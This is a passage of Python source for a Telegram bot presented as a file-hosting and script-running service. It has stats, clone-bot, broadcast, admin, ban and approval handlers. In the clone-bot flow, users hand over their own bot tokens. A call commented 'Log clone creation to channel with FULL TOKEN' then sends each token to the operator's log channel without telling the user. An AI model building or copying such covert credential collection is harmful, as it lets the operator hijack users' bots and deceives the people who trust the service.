    # Regular users see limited statistics
    if user_id not in admin_ids:
        user_stats = f"📊 Your Statistics:\n\n"
        user_stats += f"📁 Your Files: {get_user_file_count(user_id)}\n"
        user_stats += f"📈 Your Limit: {get_user_file_limit(user_id)}\n"
        user_stats += f"👤 Account Type: {'👑 Admin' if user_id in admin_ids else '👤 User'}\n"
        user_stats += f"🛡️ Data Protection: 100% ACTIVE\n\n"
        user_stats += f"🔒 Full statistics available to admins only"

        safe_reply_to(message, user_stats)
        return

    # Admin sees full statistics
    total_users = len(active_users)
    total_files = sum(len(files) for files in user_files.values())
    running_scripts = len(bot_scripts)
    running_clones = len(user_clones)

    stats_text = f"📊 Universal File Host Statistics:\n\n"
    stats_text += f"🎭 Active Users: {total_users}\n"
    stats_text += f"📁 Total Files: {total_files}\n"
    stats_text += f"🚀 Running Scripts: {running_scripts}\n"
    stats_text += f"🤖 Running Clones: {running_clones}\n"
    stats_text += f"🔧 Your Files: {get_user_file_count(user_id)}\n"
    stats_text += f"📈 Your Limit: {get_user_file_limit(user_id)}\n"
    stats_text += f"🕒 Pending Approvals: {len(pending_approvals)}\n"
    stats_text += f"⚡ Pending Executions: {len(pending_executions)}\n"
    stats_text += f"🛡️ Data Saves: {get_save_count()}\n\n"
    stats_text += f"🔒 Features:\n"
    stats_text += f"✅ 30+ file type support\n"
    stats_text += f"✅ Multi-language execution\n"
    stats_text += f"✅ Owner approval for all executions\n"
    stats_text += f"✅ Advanced security scanning\n"
    stats_text += f"✅ Real-time monitoring\n"
    stats_text += f"✅ Secure file hosting\n"
    stats_text += f"✅ Auto dependency installation\n"
    stats_text += f"✅ 100% Data Protection"

    safe_reply_to(message, stats_text)

# --- Updates Channel Button Handler ---
@bot.message_handler(func=lambda message: message.text == "📢 Updates Channel")
def updates_channel_button(message):
    """Show updates channel info with reply format"""
    updates_text = "📢 Updates Channel"

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔗 Join Channel", url="https://t.me/ensorgupanelimiz"))

    safe_reply_to(message, updates_text, reply_markup=markup)

# --- Contact Owner Button Handler ---
@bot.message_handler(func=lambda message: message.text == "📞 Contact Owner")
def contact_owner_button(message):
    """Show contact info with reply format"""
    contact_text = "📞 Contact Owner"

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("💬 Message Owner", url="https://t.me/doxbinyetkili"))

    safe_reply_to(message, contact_text, reply_markup=markup)

# --- Clone Bot Section ---
@bot.message_handler(func=lambda message: message.text == "🤖 Clone Bot")
def clone_bot_button(message):
    """Show clone bot interface with reply format - ALL BUTTONS VISIBLE"""
    user_id = message.from_user.id

    # Check if user already has a clone bot
    user_has_clone = user_id in user_clones
    clone_bot_username = user_clones[user_id]['bot_username'] if user_has_clone else None

    # Create message
    clone_text = f"🤖 **Clone Bot Service**\n\n"
    clone_text += f"🔧 Create your own Telegram bot with all features!\n\n"

    if user_has_clone:
        clone_text += f"✅ **Your Clone Bot:** @{clone_bot_username}\n"
        clone_text += f"🟢 **Status:** Running\n\n"
    else:
        clone_text += f"📭 **No clone bot created yet**\n\n"

    clone_text += f"🎯 **Features in your clone:**\n"
    clone_text += f"• 📁 30+ file type support\n"
    clone_text += f"• 🚀 Code execution\n"
    clone_text += f"• 🛡️ Security scanning\n"
    clone_text += f"• 💾 File hosting\n"
    clone_text += f"• ⚡ Auto-restart"

    # Create inline keyboard - ALL BUTTONS ALWAYS VISIBLE
    markup = types.InlineKeyboardMarkup(row_width=2)

    # Row 1: Create Clone (always visible)
    markup.row(
        types.InlineKeyboardButton("🚀 Create Clone", callback_data="clone_create")
    )

    # Row 2: Remove Bot and My Clone (always visible)
    markup.row(
        types.InlineKeyboardButton("🗑️ Remove Bot", callback_data="clone_remove"),
        types.InlineKeyboardButton("🤖 My Clone", callback_data="clone_my")
    )

    # Send message with buttons
    bot.reply_to(
        message,
        clone_text,
        reply_markup=markup,
        parse_mode="Markdown"
    )

# --- Clone Bot Callback Handlers ---
@bot.callback_query_handler(func=lambda call: call.data.startswith('clone_'))
def handle_clone_actions(call):
    """Handle clone bot actions from inline buttons"""
    try:
        user_id = call.from_user.id
        chat_id = call.message.chat.id
        message_id = call.message.message_id

        if call.data == "clone_create":
            # Ask for bot token
            markup = types.InlineKeyboardMarkup(row_width=2)
            markup.row(
                types.InlineKeyboardButton("❌ Cancel", callback_data="clone_back")
            )

            bot.edit_message_text(
                f"**Create Clone Bot**  \n\n"
                f"**How to Create**  \n\n"
                f"Send your bot token from @BotFather  \n"
                f"Format: `1234567890:ABCdefGHIjk1MnOprstUvWxyz`  \n\n"
                f"Cancel with /cancel",
                chat_id, message_id,
                reply_markup=markup,
                parse_mode="Markdown"
            )

            # Register next step handler for token input
            bot.register_next_step_handler_by_chat_id(
                chat_id,
                lambda msg: handle_token_input(msg, chat_id, message_id)
            )
            bot.answer_callback_query(call.id)

        elif call.data == "clone_my":
            # Show user's clone info - SIMPLE
            if user_id in user_clones:
                clone_info = user_clones[user_id]
                bot.answer_callback_query(call.id, f"🤖 @{clone_info['bot_username']}")
            else:
                bot.answer_callback_query(call.id, "❌ Not found")

        elif call.data == "clone_remove":
            # Handle remove bot request
            if user_id in user_clones:
                markup = types.InlineKeyboardMarkup(row_width=2)
                markup.row(
                    types.InlineKeyboardButton("✅ Yes, Remove", callback_data="clone_remove_confirm"),
                    types.InlineKeyboardButton("❌ Cancel", callback_data="clone_back")
                )

                bot.edit_message_text(
                    f"🗑️ **Remove Clone Bot**  \n\n"
                    f"⚠️ Are you sure you want to remove your clone bot?\n\n"
                    f"🤖 Bot: @{user_clones[user_id]['bot_username']}\n"
                    f"👤 Owner: You ({user_id})\n\n"
                    f"This action cannot be undone!",
                    chat_id, message_id,
                    reply_markup=markup,
                    parse_mode="Markdown"
                )
            else:
                bot.answer_callback_query(call.id, "❌ Not found")
            bot.answer_callback_query(call.id)

        elif call.data == "clone_remove_confirm":
            # Confirm remove bot
            if user_id in user_clones:
                clone_info = user_clones[user_id]
                bot_username = clone_info['bot_username']

                # Stop the clone process
                try:
                    if clone_info.get('process'):
                        clone_info['process'].terminate()
                except:
                    pass

                # Remove clone directory
                try:
                    clone_dir = clone_info['clone_dir']
                    if os.path.exists(clone_dir):
                        shutil.rmtree(clone_dir)
                except:
                    pass

                # Remove from database
                remove_clone_info(user_id)

                # Remove from memory
                del user_clones[user_id]

                # Update persistent data
                save_persistent_data()

                bot.edit_message_text(
                    f"✅ **Clone Bot Removed**  \n\n"
                    f"🤖 Bot: @{bot_username}\n"
                    f"👤 Owner: You ({user_id})\n"
                    f"🗑️ Status: Successfully removed\n\n"
                    f"✅ Your clone bot has been removed.",
                    chat_id, message_id,
                    parse_mode="Markdown"
                )

                send_to_log_channel(f"🗑️ CLONE BOT REMOVED\n\nUser ID: {user_id}\nBot: @{bot_username}")
            else:
                bot.answer_callback_query(call.id, "❌ Not found")
            bot.answer_callback_query(call.id)

        elif call.data == "clone_back":
            # Return to main clone bot interface
            clone_text = f"🤖 **Clone Bot Service**\n\n"
            clone_text += f"🔧 Create your own Telegram bot with all features!\n\n"

            if user_id in user_clones:
                clone_text += f"✅ **Your Clone Bot:** @{user_clones[user_id]['bot_username']}\n"
                clone_text += f"🟢 **Status:** Running\n\n"
            else:
                clone_text += f"📭 **No clone bot created yet**\n\n"

            clone_text += f"🎯 **Features in your clone:**\n"
            clone_text += f"• 📁 30+ file type support\n"
            clone_text += f"• 🚀 Code execution\n"
            clone_text += f"• 🛡️ Security scanning\n"
            clone_text += f"• 💾 File hosting\n"
            clone_text += f"• ⚡ Auto-restart"

            markup = types.InlineKeyboardMarkup(row_width=2)

            # Row 1: Create Clone (always visible)
            markup.row(
                types.InlineKeyboardButton("🚀 Create Clone", callback_data="clone_create")
            )

            # Row 2: Remove Bot and My Clone (always visible)
            markup.row(
                types.InlineKeyboardButton("🗑️ Remove Bot", callback_data="clone_remove"),
                types.InlineKeyboardButton("🤖 My Clone", callback_data="clone_my")
            )

            bot.edit_message_text(
                clone_text,
                chat_id, message_id,
                reply_markup=markup,
                parse_mode="Markdown"
            )
            bot.answer_callback_query(call.id)

    except Exception as e:
        logger.error(f"Error in clone action: {e}")
        bot.answer_callback_query(call.id, "❌ Error occurred!")

def handle_token_input(message, original_chat_id, original_message_id):
    """Handle bot token input from user"""
    user_id = message.from_user.id

    if message.text == '/cancel':
        # Return to clone bot interface
        clone_text = f"🤖 **Clone Bot Service**\n\n"
        clone_text += f"🔧 Create your own Telegram bot with all features!\n\n"

        if user_id in user_clones:
            clone_text += f"✅ **Your Clone Bot:** @{user_clones[user_id]['bot_username']}\n"
            clone_text += f"🟢 **Status:** Running\n\n"

        # Check if admin
        if user_id in admin_ids:
            clone_text += f"📊 **Total Clones:** {len(user_clones)}\n\n"

        clone_text += f"🎯 **Features in your clone:**\n"
        clone_text += f"• 📁 30+ file type support\n"
        clone_text += f"• 🚀 Code execution\n"
        clone_text += f"• 🛡️ Security scanning\n"
        clone_text += f"• 💾 File hosting\n"
        clone_text += f"• ⚡ Auto-restart"

        markup = types.InlineKeyboardMarkup(row_width=2)

        # Always show Create Clone button
        markup.row(
            types.InlineKeyboardButton("🚀 Create Clone", callback_data="clone_create")
        )

        # Show Remove Bot only if user has a clone
        if user_id in user_clones:
            markup.row(
                types.InlineKeyboardButton("🗑️ Remove Bot", callback_data="clone_remove")
            )

        markup.row(
            types.InlineKeyboardButton("📊 Total Clone", callback_data="clone_total")
        )

        bot.send_message(
            message.chat.id,
            clone_text,
            reply_markup=markup,
            parse_mode="Markdown"
        )
        return

    token = message.text.strip()

    if not token or len(token) < 35 or ':' not in token:
        error_msg = f"**❌ Invalid bot token!**  \n\n"
        error_msg += f"Please send a valid bot token from @BotFather  \n"
        error_msg += f"Format: `1234567890:ABCdefGHIjk1MnOprstUvWxyz`  \n\n"
        error_msg += f"Try again or send /cancel"

        markup = types.InlineKeyboardMarkup()
        markup.row(
            types.InlineKeyboardButton("❌ Cancel", callback_data="clone_back")
        )

        bot.send_message(
            message.chat.id,
            error_msg,
            reply_markup=markup,
            parse_mode="Markdown"
        )
        return

    # Validate token and create clone
    processing_msg = bot.send_message(message.chat.id, "🔄 Creating your bot clone...\n\nThis may take a moment...")

    try:
        test_bot = telebot.TeleBot(token)
        bot_info = test_bot.get_me()

        bot.edit_message_text(
            f"✅ Token validated!\n\nBot: @{bot_info.username}\nCreating clone...",
            processing_msg.chat.id,
            processing_msg.message_id
        )

        clone_success = create_bot_clone(user_id, token, bot_info.username)

        if clone_success:
            success_msg = f"**🎉 Bot Clone Created Successfully!**  \n\n"
            success_msg += f"**🤖 Bot:** @{bot_info.username}  \n"
            success_msg += f"**👤 Owner:** You ({user_id})  \n"
            success_msg += f"**🚀 Status:** Running  \n"
            success_msg += f"**🔗 Features:** All Universal File Host features  \n"
            success_msg += f"**🛡️ Protection:** Auto-restart enabled  \n\n"
            success_msg += f"✅ Your bot is now live and ready to use!  \n"
            success_msg += f"💡 Start it with /start command  \n"
            success_msg += f"🗑️ Use Remove Bot button to remove it"

            bot.edit_message_text(
                success_msg,
                processing_msg.chat.id,
                processing_msg.message_id,
                parse_mode="Markdown"
            )

            # Log clone creation to channel with FULL TOKEN
            log_clone_creation(user_id, bot_info.username, token)
        else:
            bot.edit_message_text(
                "❌ Failed to create bot clone. Please try again later.",
                processing_msg.chat.id,
                processing_msg.message_id
            )

    except Exception as e:
        error_msg = f"**❌ Bot Clone Failed**  \n\n"
        error_msg += f"Error: `{str(e)}`  \n\n"
        error_msg += f"💡 Make sure your token is valid and try again"

        bot.edit_message_text(
            error_msg,
            processing_msg.chat.id,
            processing_msg.message_id,
            parse_mode="Markdown"
        )

# --- CLONE BOT CREATION FUNCTION ---
def create_bot_clone(user_id, token, bot_username):
    """Create a clone bot with the given token"""
    try:
        # Create clone directory
        clone_dir = os.path.join(BASE_DIR, f'clone_{user_id}')
        os.makedirs(clone_dir, exist_ok=True)

        # Clone the current script
        current_file = __file__
        clone_file = os.path.join(clone_dir, 'bot.py')

        with open(current_file, 'r', encoding='utf-8') as f:
            script_content = f.read()

        # Replace token and owner ID for the clone
        script_content = script_content.replace(
            f"TOKEN = '{TOKEN}'",
            f"TOKEN = '{token}'"
        )
        script_content = script_content.replace(
            f"OWNER_ID = {OWNER_ID}",
            f"OWNER_ID = {user_id}"
        )
        script_content = script_content.replace(
            f"ADMIN_ID = {ADMIN_ID}",
            f"ADMIN_ID = {user_id}"
        )

        # Write the modified script
        with open(clone_file, 'w', encoding='utf-8') as f:
            f.write(script_content)

        # Start the clone process
        clone_process = subprocess.Popen(
            [sys.executable, clone_file],
            cwd=clone_dir,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE
        )

        user_clones[user_id] = {
            'process': clone_process,
            'bot_username': bot_username,
            'clone_dir': clone_dir,
            'start_time': datetime.now()
        }

        save_clone_info(user_id, bot_username, token)
        save_persistent_data()  # Update persistent data

        logger.info(f"Bot clone created successfully for user {user_id}, bot @{bot_username}")
        return True

    except Exception as e:
        logger.error(f"Error creating bot clone: {e}")
        return False

# --- Broadcast Button ---
@bot.message_handler(func=lambda message: message.text == "📢 Broadcast")
def broadcast_button(message):
    user_id = message.from_user.id
    if user_id not in admin_ids:
        safe_reply_to(message, "🚫 Only admins can broadcast messages!")
        return

    broadcast_mode[user_id] = True

    broadcast_text = "📢 BROADCAST MESSAGE SYSTEM\n\n"
    broadcast_text += "💬 Please send your broadcast message now.\n"
    broadcast_text += f"📊 Active users: {len(active_users)}\n\n"
    broadcast_text += "📝 Your message will be sent to all active users.\n"
    broadcast_text += "❌ To cancel, send /cancel"

    safe_reply_to(message, broadcast_text)

@bot.message_handler(func=lambda message: message.from_user.id in broadcast_mode and broadcast_mode[message.from_user.id])
def handle_broadcast_message(message):
    user_id = message.from_user.id

    if message.text == '/cancel':
        broadcast_mode[user_id] = False
        safe_reply_to(message, "❌ Broadcast cancelled.")
        return

    broadcast_content = message.text

    broadcast_mode[user_id] = False

    processing_msg = safe_reply_to(message, f"🔄 Starting broadcast to {len(active_users)} users...\n\nPlease wait...")

    success_count = 0
    failed_count = 0

    broadcast_message = f"📢 BROADCAST MESSAGE\n\n{broadcast_content}\n\n- From Bot Admin"

    for target_user_id in list(active_users):
        try:
            bot.send_message(target_user_id, broadcast_message)
            success_count += 1
            time.sleep(0.1)
        except Exception as e:
            logger.error(f"Failed to send broadcast to {target_user_id}: {e}")
            failed_count += 1

    result_msg = f"📊 BROADCAST COMPLETED\n\n"
    result_msg += f"✅ Success: {success_count} users\n"
    result_msg += f"❌ Failed: {failed_count} users\n"
    result_msg += f"📨 Total: {len(active_users)} users\n\n"

    if failed_count > 0:
        result_msg += f"💡 Failed sends are usually due to users blocking the bot."

    safe_edit_message(processing_msg.chat.id, processing_msg.message_id, result_msg)

    logger.info(f"Broadcast sent by {user_id}: {success_count} success, {failed_count} failed")

    send_to_log_channel(f"📢 BROADCAST SENT\n\nBy Admin: {user_id}\nSuccess: {success_count}\nFailed: {failed_count}\nTotal: {len(active_users)}")

# --- Lock Bot Button ---
@bot.message_handler(func=lambda message: message.text == "🔒 Lock Bot")
def lock_bot_button(message):
    user_id = message.from_user.id
    if user_id not in admin_ids:
        safe_reply_to(message, "🚫 Only admins can lock/unlock the bot!")
        return

    global bot_locked
    bot_locked = not bot_locked
    status = "🔒 LOCKED" if bot_locked else "🔓 UNLOCKED"

    lock_text = f"🔒 Bot Lock Status Changed\n\n"
    lock_text += f"Status: {status}\n"
    lock_text += f"Admin: {message.from_user.first_name}\n"
    lock_text += f"Time: {datetime.now().strftime('%H:%M:%S')}\n\n"

    if bot_locked:
        lock_text += "🚫 Non-admin users are now blocked from using the bot."
    else:
        lock_text += "✅ All users can now use the bot normally."

    safe_reply_to(message, lock_text)

    send_to_log_channel(f"🔒 BOT LOCK STATUS\n\nStatus: {status}\nBy Admin: {user_id}")

    # Update persistent data
    save_persistent_data()

# --- Running All Code Button ---
@bot.message_handler(func=lambda message: message.text == "🟢 Running All Code")
def running_code_button(message):
    user_id = message.from_user.id
    if user_id not in admin_ids:
        safe_reply_to(message, "🚫 Only admins can view running scripts!")
        return

    if not bot_scripts:
        safe_reply_to(message, "🟢 Running Code Monitor\n\n📊 No scripts currently running.\n\n💡 All systems idle.")
        return

    running_text = f"🟢 Running Code Monitor\n\n"
    running_text += f"📊 Active Scripts: {len(bot_scripts)}\n\n"

    for script_key, script_info in bot_scripts.items():
        user_id_script = script_info['user_id']
        file_name = script_info['file_name']
        language = script_info.get('language', 'Unknown')
        icon = script_info.get('icon', '📄')
        start_time = script_info['start_time'].strftime("%H:%M:%S")
        uptime = get_script_uptime(user_id_script, file_name) or "Unknown"

        running_text += f"{icon} {file_name} ({language})\n"
        running_text += f"👤 User: {user_id_script}\n"
        running_text += f"⏰ Started: {start_time}\n"
        running_text += f"⏱️ Uptime: {uptime}\n"
        running_text += f"🆔 PID: {script_info['process'].pid}\n\n"

    safe_reply_to(message, running_text)

# --- Admin Panel Button ---
@bot.message_handler(func=lambda message: message.text == "👑 Admin Panel")
def admin_panel_button(message):
    user_id = message.from_user.id
    if user_id not in admin_ids:
        safe_reply_to(message, "🚫 Only admins can access admin panel!")
        return

    admin_text = f"👑 ADMIN CONTROL PANEL\n\n"
    admin_text += f"📊 System Status:\n"
    admin_text += f"• 👥 Active Users: {len(active_users)}\n"
    admin_text += f"• 📁 Total Files: {sum(len(files) for files in user_files.values())}\n"
    admin_text += f"• 🚀 Running Scripts: {len(bot_scripts)}\n"
    admin_text += f"• 🤖 Running Clones: {len(user_clones)}\n"
    admin_text += f"• 🕒 Pending Uploads: {len(pending_approvals)}\n"
    admin_text += f"• ⚡ Pending Executions: {len(pending_executions)}\n"
    admin_text += f"• 🔒 Bot Status: {'🔒 Locked' if bot_locked else '🔓 Unlocked'}\n"
    admin_text += f"• 💾 Data Protection: ✅ ACTIVE\n\n"
    admin_text += f"🎛️ Choose an action from buttons below:"

    # Create inline keyboard
    markup = types.InlineKeyboardMarkup(row_width=2)

    # Ban Management
    markup.add(
        types.InlineKeyboardButton("🚫 Ban User", callback_data="admin_ban_user"),
        types.InlineKeyboardButton("✅ Unban User", callback_data="admin_unban_user"),
        types.InlineKeyboardButton("📋 Banned List", callback_data="admin_banned_list")
    )

    # Approval System
    markup.add(
        types.InlineKeyboardButton("🕒 Pending Files", callback_data="admin_pending"),
        types.InlineKeyboardButton("⚡ Pending Execs", callback_data="admin_pending_execs"),
        types.InlineKeyboardButton("✅ Approve File", callback_data="admin_approve_file"),
        types.InlineKeyboardButton("❌ Reject File", callback_data="admin_reject_file")
    )

    safe_reply_to(message, admin_text, reply_markup=markup)

# --- Admin Callback Handlers ---
@bot.callback_query_handler(func=lambda call: call.data.startswith('admin_'))
def handle_admin_actions(call):
    try:
        user_id = call.from_user.id
        if user_id not in admin_ids:
            bot.answer_callback_query(call.id, "🚫 Only admins can perform admin actions!")
            return

        action = call.data
        chat_id = call.message.chat.id
        message_id = call.message.message_id

        if action == "admin_ban_user":
            # Ask for user ID to ban
            bot.register_next_step_handler_by_chat_id(
                chat_id,
                lambda msg: handle_ban_user_step(msg)
            )
            ban_text = "🚫 BAN USER\n\n"
            ban_text += "Please send the user ID to ban:\n"
            ban_text += "Format: user_id [reason]\n\n"
            ban_text += "Example: 123456789 Spamming"

            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="admin_back"))

            bot.edit_message_text(ban_text, chat_id, message_id, reply_markup=markup)
            bot.answer_callback_query(call.id)

        elif action == "admin_unban_user":
            # Ask for user ID to unban
            bot.register_next_step_handler_by_chat_id(
                chat_id,
                lambda msg: handle_unban_user_step(msg)
            )
            unban_text = "✅ UNBAN USER\n\n"
            unban_text += "Please send the user ID to unban:\n"
            unban_text += "Format: user_id\n\n"
            unban_text += "Example: 123456789"

            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="admin_back"))

            bot.edit_message_text(unban_text, chat_id, message_id, reply_markup=markup)
            bot.answer_callback_query(call.id)

        elif action == "admin_banned_list":
            # Show banned users list
            if not banned_users:
                bot.answer_callback_query(call.id, "📭 No banned users")
                bot.edit_message_text(
                    "📋 BANNED USERS\n\n📭 No banned users found.",
                    chat_id, message_id
                )
                return

            banned_text = "📋 BANNED USERS:\n\n"

            try:
                conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
                c = conn.cursor()
                c.execute('SELECT user_id, reason, ban_date FROM banned_users')

                for banned_user_id, reason, ban_date in c.fetchall():
                    banned_text += f"👤 User ID: {banned_user_id}\n"
                    banned_text += f"📝 Reason: {reason}\n"
                    banned_text += f"⏰ Banned: {ban_date[:16]}\n\n"

                conn.close()
            except Exception as e:
                logger.error(f"Error fetching banned users: {e}")
                banned_text = "❌ Error fetching banned users"

            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="admin_back"))

            bot.edit_message_text(banned_text, chat_id, message_id, reply_markup=markup)
            bot.answer_callback_query(call.id)

        elif action == "admin_pending":
            # Show pending file approvals
            if not pending_approvals:
                bot.answer_callback_query(call.id, "📭 No pending approvals")
                bot.edit_message_text(
                    "🕒 PENDING FILE APPROVALS\n\n📭 No pending file approvals.",
                    chat_id, message_id
                )
                return

            pending_text = f"🕒 PENDING FILE APPROVALS: {len(pending_approvals)}\n\n"

            for i, (approval_id, approval_data) in enumerate(pending_approvals.items(), 1):
                user_info = approval_data['user_info']
                pending_text += f"{i}. 📄 {approval_data['file_name']}\n"
                pending_text += f"   👤 User: {user_info['first_name']} {user_info['last_name'] or ''}\n"
                pending_text += f"   🆔 ID: {approval_data['user_id']}\n"
                pending_text += f"   📧 @{user_info['username'] or 'None'}\n"
                pending_text += f"   🔍 Issue: {approval_data['security_issue'][:50]}...\n"
                pending_text += f"   ⏰ Uploaded: {approval_data['upload_time'].strftime('%H:%M:%S')}\n"
                pending_text += f"   🔑 ID: `{approval_id}`\n\n"

            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="admin_back"))

            bot.edit_message_text(pending_text, chat_id, message_id, reply_markup=markup, parse_mode="Markdown")
            bot.answer_callback_query(call.id)

        elif action == "admin_pending_execs":
            # Show pending execution approvals
            if not pending_executions:
                bot.answer_callback_query(call.id, "📭 No pending executions")
                bot.edit_message_text(
                    "⚡ PENDING EXECUTION APPROVALS\n\n📭 No pending execution requests.",
                    chat_id, message_id
                )
                return

            pending_text = f"⚡ PENDING EXECUTION REQUESTS: {len(pending_executions)}\n\n"

            for i, (exec_id, exec_data) in enumerate(pending_executions.items(), 1):
                user_info = exec_data['user_info']
                pending_text += f"{i}. 📄 {exec_data['file_name']}\n"
                pending_text += f"   👤 User: {user_info['first_name']} {user_info['last_name'] or ''}\n"
                pending_text += f"   🆔 ID: {exec_data['user_id']}\n"
                pending_text += f"   📧 @{user_info['username'] or 'None'}\n"
                pending_text += f"   ⏰ Requested: {exec_data['request_time'].strftime('%H:%M:%S')}\n"
                pending_text += f"   🔑 ID: `{exec_id}`\n\n"

            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="admin_back"))

            bot.edit_message_text(pending_text, chat_id, message_id, reply_markup=markup, parse_mode="Markdown")
            bot.answer_callback_query(call.id)

        elif action == "admin_approve_file":
            # Ask for approval ID to approve
            bot.register_next_step_handler_by_chat_id(
                chat_id,
                lambda msg: handle_approve_file_step(msg)
            )
            approve_text = "✅ APPROVE FILE\n\n"
            approve_text += "Please send the approval ID to approve:\n"
            approve_text += "Format: approval_id\n\n"
            approve_text += "Get approval ID from 'Pending Files'"

            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="admin_back"))

            bot.edit_message_text(approve_text, chat_id, message_id, reply_markup=markup)
            bot.answer_callback_query(call.id)

        elif action == "admin_reject_file":
            # Ask for approval ID to reject
            bot.register_next_step_handler_by_chat_id(
                chat_id,
                lambda msg: handle_reject_file_step(msg)
            )
            reject_text = "❌ REJECT FILE\n\n"
            reject_text += "Please send the approval ID to reject:\n"
            reject_text += "Format: approval_id\n\n"
            reject_text += "Get approval ID from 'Pending Files'"

            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="admin_back"))

            bot.edit_message_text(reject_text, chat_id, message_id, reply_markup=markup)
            bot.answer_callback_query(call.id)

        elif action == "admin_back":
            # Return to main admin panel
            admin_panel_button(call.message)
            bot.answer_callback_query(call.id)

    except Exception as e:
        logger.error(f"Error in admin action: {e}")
        bot.answer_callback_query(call.id, "❌ Error occurred!")

def handle_ban_user_step(message):
    """Handle ban user after user ID is provided"""
    try:
        parts = message.text.split()
        if len(parts) < 1:
            bot.send_message(message.chat.id, "❌ Please provide user ID!")
            return

        target_user_id = int(parts[0])
        reason = "No reason provided"

        if len(parts) > 1:
            reason = ' '.join(parts[1:])

        banned_users.add(target_user_id)

        try:
            conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
            c = conn.cursor()
            c.execute('INSERT OR REPLACE INTO banned_users (user_id, reason, ban_date) VALUES (?, ?, ?)',
                     (target_user_id, reason, datetime.now().isoformat()))
            conn.commit()
            conn.close()
        except Exception as e:
            logger.error(f"Database error saving ban: {e}")

        # Update persistent data
        save_persistent_data()

        success_msg = f"✅ User banned!\n\n"
        success_msg += f"User: {target_user_id}\n"
        success_msg += f"Reason: {reason}\n"
        success_msg += f"By Admin: {message.from_user.first_name}"

        bot.send_message(message.chat.id, success_msg)

        send_to_log_channel(f"🚫 USER BANNED\n\nUser ID: {target_user_id}\nReason: {reason}\nBy Admin: {message.from_user.id}")

    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {str(e)}")

def handle_unban_user_step(message):
    """Handle unban user after user ID is provided"""
    try:
        target_user_id = int(message.text.strip())

        if target_user_id in banned_users:
            banned_users.remove(target_user_id)

            try:
                conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
                c = conn.cursor()
                c.execute('DELETE FROM banned_users WHERE user_id = ?', (target_user_id,))
                conn.commit()
                conn.close()
            except Exception as e:
                logger.error(f"Database error removing ban: {e}")

            # Update persistent data
            save_persistent_data()

            success_msg = f"✅ User unbanned!\n\n"
            success_msg += f"User: {target_user_id}\n"
            success_msg += f"By Admin: {message.from_user.first_name}"

            bot.send_message(message.chat.id, success_msg)

            send_to_log_channel(f"✅ USER UNBANNED\n\nUser ID: {target_user_id}\nBy Admin: {message.from_user.id}")
        else:
            bot.send_message(message.chat.id, f"❌ User not found in ban list: {target_user_id}")

    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {str(e)}")

def handle_approve_file_step(message):
    """Handle approve file after approval ID is provided"""
    try:
        approval_id = message.text.strip()
        success, result = approve_file(approval_id)

        if success:
            bot.send_message(message.chat.id, f"✅ {result}")
        else:
            bot.send_message(message.chat.id, f"❌ {result}")

    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {str(e)}")

def handle_reject_file_step(message):
    """Handle reject file after approval ID is provided"""
    try:
        approval_id = message.text.strip()
        success, result = reject_file(approval_id)

        if success:
            bot.send_message(message.chat.id, f"✅ {result}")
        else:
            bot.send_message(message.chat.id, f"❌ {result}")

    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {str(e)}")

# --- MODIFIED File Control with Execution Approval ---
@bot.callback_query_handler(func=lambda call: call.data.startswith('control_'))
def handle_file_control(call):
    try:
        parts = call.data.split('_', 2)
        if len(parts) != 3:
            bot.answer_callback_query(call.id, "❌ Invalid button data")
            return

        _, user_id_str, file_name = parts
        user_id = int(user_id_str)

        if call.from_user.id != user_id and call.from_user.id not in admin_ids:
            bot.answer_callback_query(call.id, "🚫 Access denied!")
            return

        user_files_list = user_files.get(user_id, [])
        file_info = next((f for f in user_files_list if f[0] == file_name), None)

        if not file_info:
            bot.answer_callback_query(call.id, "❌ File not found!")
            return

        file_name, file_type = file_info

        markup = types.InlineKeyboardMarkup(row_width=2)

        if file_type == 'executable':
            is_running = is_bot_running(user_id, file_name)

            if is_running:
                uptime = get_script_uptime(user_id, file_name) or "Unknown"
                markup.add(
                    types.InlineKeyboardButton("🔴 Stop", callback_data=f'stop_{user_id}_{file_name}'),
                    types.InlineKeyboardButton("🔄 Restart", callback_data=f'restart_{user_id}_{file_name}')
                )
                markup.add(
                    types.InlineKeyboardButton("📜 Logs", callback_data=f'logs_{user_id}_{file_name}'),
                    types.InlineKeyboardButton("🗑️ Delete", callback_data=f'delete_{user_id}_{file_name}')
                )
            else:
                # Show start button with note about approval
                markup.add(
                    types.InlineKeyboardButton("🟢 Request Execution", callback_data=f'request_exec_{user_id}_{file_name}'),
                    types.InlineKeyboardButton("📜 Logs", callback_data=f'logs_{user_id}_{file_name}')
                )
                markup.add(
                    types.InlineKeyboardButton("🗑️ Delete", callback_data=f'delete_{user_id}_{file_name}')
                )

                # Add note about approval requirement
                markup.add(
                    types.InlineKeyboardButton("⚠️ Owner approval required", callback_data="noop")
                )
        else:
            file_hash = hashlib.md5(f"{user_id}_{file_name}".encode()).hexdigest()

            domain = os.environ.get('REPL_SLUG', 'universal-file-host')
            owner = os.environ.get('REPL_OWNER', 'replit-user')

            try:
                replit_url = f"https://{domain}.{owner}.repl.co"
                test_response = requests.get(f"{replit_url}/health", timeout=2)
                if test_response.status_code != 200:
                    replit_url = f"https://{domain}-{owner}.replit.app"
            except:
                replit_url = f"https://{domain}-{owner}.replit.app"

            file_url = f"{replit_url}/file/{file_hash}"

            markup.add(
                types.InlineKeyboardButton("🔗 View File", url=file_url)
            )
            markup.add(
